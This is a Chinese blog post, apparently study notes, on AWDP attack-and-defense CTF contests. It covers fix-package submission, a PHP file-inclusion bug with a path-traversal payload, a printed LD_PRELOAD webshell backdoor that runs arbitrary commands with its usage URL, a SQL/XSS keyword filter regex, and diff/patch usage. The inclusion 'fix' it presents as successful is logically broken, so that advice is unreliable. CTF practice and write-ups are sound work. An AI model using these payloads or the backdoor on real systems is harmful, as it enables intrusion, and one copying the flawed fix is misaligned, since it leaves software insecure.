---
title: awdp测试
categories:
  - awdp
  
abbrlink: 2701
date: 2024.06.17
tags: 
   - php 
   - web
swiper_index: 1

---





# 介绍

首先了解一下什么是 AWDP ，AWDP模式（Attack,Defense,WebandPwn），分为 Break 与 Fix 环节。根据英文全称也可以看出来，只有 Web 和 Pwn 这两个方向的题目。

每个战队拥有相同的起始分数及相同配置的虚拟靶机，参赛队员需对平台中的GameBox发起攻击，向平台提交正确的flag（证明自己具备对该题的攻击能力）；在此期间，由平台以轮次制的方式向参赛战队的靶机发起攻击，检查其他选手的漏洞是否修补成功，若修补成功则认为参赛战队具备该漏洞的防御能力。

简单来说，AWDP 和传统 CTF 并无任何区别，仅仅是多了一个 Fix 功能，也就是你提交 flag 后拿到的是攻击分，而 Fix 成功后才会拿到防御分

首先，主办方会给你一个ftp让你连到服务器上，你可以传一个update.tar.gz，里面应当包含一个文件，还有一个update.sh，然后这个update.sh里面就是你要执行的命令，这里的修复主要讲的就是你用修改了的文件替换原有题目的文件，然后update.sh的内容比如就是：

```
#!/bin/bash

cp index.php /var/www/html/index.php
```

路径啥的主办方是会给你的，打包命令就是：

```
tar zcvf update.tar.gz update.sh file1 file2
```



# 例题

1.

```php
<?php
        $action = (isset($_GET['action']) ? $_GET['action'] : 'home.php');
        if (file_exists($action)) {
            include $action;
        } else {
            echo "File not found!";
        }
		
            ?>

```

payload: `?action=../../../../flag`

fix:黑名单防御

```php
<?php
        $action = (isset($_GET['action']) ? $_GET['action'] : 'home.php');
		$deny_ext = array("..","../");
		if (in_array($action, $deny_ext)){
            if (file_exists($action)) {
                include $action;
            } else {
                echo "File not found!";
            }
		}
		
            ?>

```

这里通过新建一个黑名单，过滤..和../的方法防御成功

2.

```
<?php
    echo "<p> <b>example</b>: http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so </p>";

    $cmd = $_GET["cmd"];
    $out_path = $_GET["outpath"];
    $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
    echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";

    putenv("EVIL_CMDLINE=" . $evil_cmdline);

    $so_path = $_GET["sopath"];
    putenv("LD_PRELOAD=" . $so_path);

    mail("", "", "", "");

    echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) . "</p>"; 

    unlink($out_path);
?>
```

扫出一个后门，发现应该是个劫持LD_PRELOAD，然后根据格式

```
http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so
```

2.防御正则：

```
function waf($s){
  if (preg_match("/select|flag|union|\\\\$|\'|\"|--|#|\\0|into|alert|img|prompt|set|/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\<|\>|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark|regexp|from|count|procedure|and|ascii|substr|substring|left|right|union|if|case|pow|exp|order|sleep|benchmark|into|load|outfile|dumpfile|load_file|join|show|select|update|set|concat|delete|alter|insert|create|union|or|drop|not|for|join|is|between|group_concat|like|where|user|ascii|greatest|mid|substr|left|right|char|hex|ord|case|limit|conv|table|mysql_history|flag|count|rpad|\&|\*|\.|/is",$s)||strlen($s)>50){
    header("Location: /");
    die();
  }
}
```

3

.一般java题漏洞都出现在依赖里，查看pom.xml,发现里面的fastjson是1.2.55的，总所周知，这个版本肯定是存在漏洞的，把依赖的版本修改为新版本1.2.83，然后再maven打包，就防御成功了。

4.linux 运行checksec命令

5.补丁工具patch：

为单个文件生成补丁

```
diff -up origin.c modify.c
```

先进性对比

- -u 显示有差异行的前后几行(上下文), 默认是前后各3行, 这样, patch中带有更多的信息.
- -p 显示代码所在的c函数的信息.

回显：

```
--- ssh 2024-06-05 02:06:37.188949705 -0400
+++ "ssh (\345\244\215\345\210\266 1)"  2024-06-19 05:36:34.479623854 -0400
@@ -18,3 +18,4 @@ 重启SSH服务
 
 sudo service sshd restart
 sudo systemctl restart sshd.service
+1111

```

```
diff -uprN origin/ modify/
```

这条命令对比了origin/和modify/两个目录下的所有源码差异.

参数详解:

- -r 递归地对比一个目录和它的所有子目录(即整个目录树).
- -N 如果某个文件缺少了, 就当作是空文件来对比. 如果不使用本选项, 当diff发现旧代码或者新代码缺少文件时, 只简单的提示缺少文件. 如果使用本选项, 会将新添加的文件全新打印出来作为新增的部分.

打补丁：

生成的补丁中, 路径信息包含了你的源码根目录的名称, 但其他人的源码根目录可能是其它名字, 所以, 打补丁时, 要进入你的源码根目录, 并且告诉patch工具, 请忽略补丁中的路径的第一级目录(参数-p1).

```
patch -p1 < patch1.diff
```

给修改过的内核生成patch，然后用生成的patch给未修改过的内核打补丁

其中，目录linux-2.6.31.3为未修改过的内核，目录linux-2.6.31.3_1为修改过的内核

```
$ diff -uparN linux-2.6.31.3 linux-2.6.31.3_1/ > mypatch
$ cd linux-2.6.31.3
$ patch -p1 < mypatch
```







![](https://pub-31f8a5138dca42ceabf3a35f657e575a.r2.dev/20250103222939748.jpg)
